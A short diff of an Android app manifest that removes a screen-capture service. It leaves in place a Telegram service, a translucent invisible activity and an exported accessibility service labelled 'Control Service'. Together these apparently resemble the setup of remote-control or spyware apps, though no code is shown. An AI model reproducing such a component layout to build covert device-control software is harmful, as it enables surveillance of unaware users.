@@ -32,7 +32,6 @@
                   android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <service android:name=".TelegramService" android:exported="false" android:foregroundServiceType="specialUse" />
-        <service android:name=".ScreenCaptureService" android:exported="false" android:foregroundServiceType="mediaProjection" />
         <service android:name=".MyAccessibilityService" android:exported="true"
                  android:label="Control Service"
                  android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
